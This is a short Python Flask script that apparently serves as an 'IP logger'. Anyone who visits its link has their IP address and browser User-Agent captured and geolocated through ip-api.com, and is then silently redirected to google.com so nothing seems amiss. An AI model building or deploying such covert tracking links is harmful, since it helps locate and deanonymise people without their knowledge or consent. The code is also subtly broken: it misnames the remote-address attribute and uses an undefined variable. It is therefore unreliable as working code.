from flask import Flask, request, redirect
import pytz, datetime
import requests

def get_ip_info(ip):
  try:
    return requests.get(url=f"http://ip-api.com/json/{ip}").json()
  except:
     print("[*] Error :: check connection")

def print_info(info):
  print("="*50)
  print("[*] Time :: " + str(datetime.datetime.now(pytz.timezone("US/Eastern"))))
  print("="*50)
  for key, value in info.items():
    print(f"[{key}] :: {value}")
    print()
  print("="*50)


app = Flask(__name__)

@app.route("/")
def ip_logger():
  try: 
    user_agent = request.headers.get('User-Agent')
    req = request.remote.addr
  
    headers = get_ip_info(ip)
    headers["User-Agent"] = user_agent
    print_info(get_ip_info(req))
  except:
    print(f"[*] Error :: check connection")
  finally:
    return redirect(location="https://google.com")


if __name__ == "__main__":
  
  HOST = "0.0.0.0"
  PORT = 11111
  URL = f"http://{HOST}:{PORT}/"

  print(f"[*] URL :: {URL} - link")
  app.run(debug=False, host=HOST, port=PORT)



